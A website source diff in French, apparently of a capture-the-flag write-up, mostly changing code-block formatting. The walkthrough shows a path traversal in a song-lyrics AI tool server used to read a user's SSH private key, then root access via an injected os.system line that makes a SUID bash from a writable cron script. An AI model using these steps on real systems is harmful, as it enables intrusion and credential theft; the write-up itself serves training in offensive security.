@@ -1881,14 +1881,20 @@ Mais en fouillant un peu, on découvre que le service est vulnérable à une <st
 <hr />
 <h3 id="1-reconnaissance">1. Reconnaissance</h3>
 <p>Le serveur expose un tool :</p>
-<div class="highlight"><pre><span></span><code><span class="p">{</span>
+<div class="highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">JSON</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal">1</span>
+<span class="normal">2</span>
+<span class="normal">3</span>
+<span class="normal">4</span>
+<span class="normal">5</span>
+<span class="normal">6</span>
+<span class="normal">7</span></pre></div></td><td class="code"><div><pre><span></span><code><span class="p">{</span>
 <span class="w">  </span><span class="nt">&quot;name&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;get_lyrics&quot;</span><span class="p">,</span>
 <span class="w">  </span><span class="nt">&quot;description&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;Get lyrics of your favourite rai song&quot;</span><span class="p">,</span>
 <span class="w">  </span><span class="nt">&quot;parameters&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">{</span>
 <span class="w">    </span><span class="nt">&quot;song_title&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;str&quot;</span>
 <span class="w">  </span><span class="p">}</span>
 <span class="p">}</span>
-</code></pre></div>
+</code></pre></div></td></tr></table></div>
 <p>En testant quelques valeurs simples (<code>"didi.txt"</code>, <code>"test"</code>) et grâce aux messages d'erreur, on comprend que le programme lit les paroles dans des fichiers.</p>
 <hr />
 <h3 id="2-exploitation-de-la-lfi">2. Exploitation de la LFI</h3>
@@ -1903,29 +1909,31 @@ Mais en fouillant un peu, on découvre que le service est vulnérable à une <st
 <li><code>../../home/boualem/.ssh/id_rsa</code>: on récupère la <strong>clé privée RSA</strong> de l'utilisateur boualem, correspondante à la clé publique du fichier <code>authorized_keys</code>.</li>
 </ul>
 <p>On sauvegarde la clé localement :</p>
-<div class="highlight"><pre><span></span><code>chmod<span class="w"> </span><span class="m">600</span><span class="w"> </span>private_key
+<div class="highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">Bash</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal">1</span>
+<span class="normal">2</span></pre></div></td><td class="code"><div><pre><span></span><code>chmod<span class="w"> </span><span class="m">600</span><span class="w"> </span>private_key
 ssh<span class="w"> </span>-i<span class="w"> </span>private_key<span class="w"> </span>boualem@127.0.0.1
-</code></pre></div>
+</code></pre></div></td></tr></table></div>
 <p>Nous sommes maintenant connectés sur la machine en tant que <code>boualem</code> !</p>
 <hr />
 <h3 id="3-escalade-de-privileges-via-cron">3. Escalade de privilèges via cron</h3>
 <p>En fouillant, on repère dans <code>/etc/cron.d/health-check-disco-maghreb</code> une tâche exécutée chaque minute par root :</p>
-<div class="highlight"><pre><span></span><code>* * * * * /usr/local/bin/python3 /app/health-check-disco-maghreb.py &gt;&gt; /var/log/health-check-disco-maghreb.log 2&gt;&amp;1
-</code></pre></div>
+<div class="highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">Text Only</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal">1</span></pre></div></td><td class="code"><div><pre><span></span><code>* * * * * /usr/local/bin/python3 /app/health-check-disco-maghreb.py &gt;&gt; /var/log/health-check-disco-maghreb.log 2&gt;&amp;1
+</code></pre></div></td></tr></table></div>
 <p>Le script <code>/app/health-check-disco-maghreb.py</code> est écrivable par <code>boualem</code> :</p>
-<div class="highlight"><pre><span></span><code>-rw-rw-r-- 1 boualem boualem 334 Aug 28 14:22 health-check-disco-maghreb.py
-</code></pre></div>
+<div class="highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">Text Only</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal">1</span></pre></div></td><td class="code"><div><pre><span></span><code>-rw-rw-r-- 1 boualem boualem 334 Aug 28 14:22 health-check-disco-maghreb.py
+</code></pre></div></td></tr></table></div>
 <p>Cela signifie que nous pouvons modifier ce script et injecter du code Python qui sera exécuté automatiquement par root à la prochaine minute.</p>
 <hr />
 <h3 id="4-exploitation-du-cron">4. Exploitation du cron</h3>
 <p>On édite le script et on ajoute par exemple :</p>
-<div class="highlight"><pre><span></span><code><span class="kn">import</span><span class="w"> </span><span class="nn">os</span>
+<div class="highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">Python</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal">1</span>
+<span class="normal">2</span></pre></div></td><td class="code"><div><pre><span></span><code><span class="kn">import</span><span class="w"> </span><span class="nn">os</span>
 <span class="n">os</span><span class="o">.</span><span class="n">system</span><span class="p">(</span><span class="s2">&quot;cp /bin/bash /tmp/bash &amp;&amp; chmod +s /tmp/bash&quot;</span><span class="p">)</span>
-</code></pre></div>
+</code></pre></div></td></tr></table></div>
 <p>Au bout d'une minute, le cron s'exécute et crée un binaire SUID root.
 Il suffit ensuite de lancer :</p>
-<div class="highlight"><pre><span></span><code>/tmp/bash<span class="w"> </span>-p
-</code></pre></div>
+<div class="highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">Bash</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal">1</span></pre></div></td><td class="code"><div><pre><span></span><code>/tmp/bash<span class="w"> </span>-p
+</code></pre></div></td></tr></table></div>
 <p>Et nous voilà <strong>root</strong> sur la machine. On peut ensuite lire le flag dans <code>/flag.txt</code> !</p>
 <h2 id="script-complet">Script complet</h2>
 <p><a href="solution.py">Le script complet est ici</a>.</p>
@@ -2038,7 +2046,7 @@ Il suffit ensuite de lancer :</p>
     
     
       
-      <script id="__config" type="application/json">{"base": "../../../..", "features": ["navigation.tabs", "navigation.tabs.sticky", "navigation.indexes"], "search": "../../../../assets/javascripts/workers/search.973d3a69.min.js", "tags": null, "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}, "version": null}</script>
+      <script id="__config" type="application/json">{"base": "../../../..", "features": ["navigation.tabs", "navigation.tabs.sticky", "navigation.indexes", "content.code.copy"], "search": "../../../../assets/javascripts/workers/search.973d3a69.min.js", "tags": null, "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}, "version": null}</script>
     
     
       <script src="../../../../assets/javascripts/bundle.f55a23d4.min.js"></script>
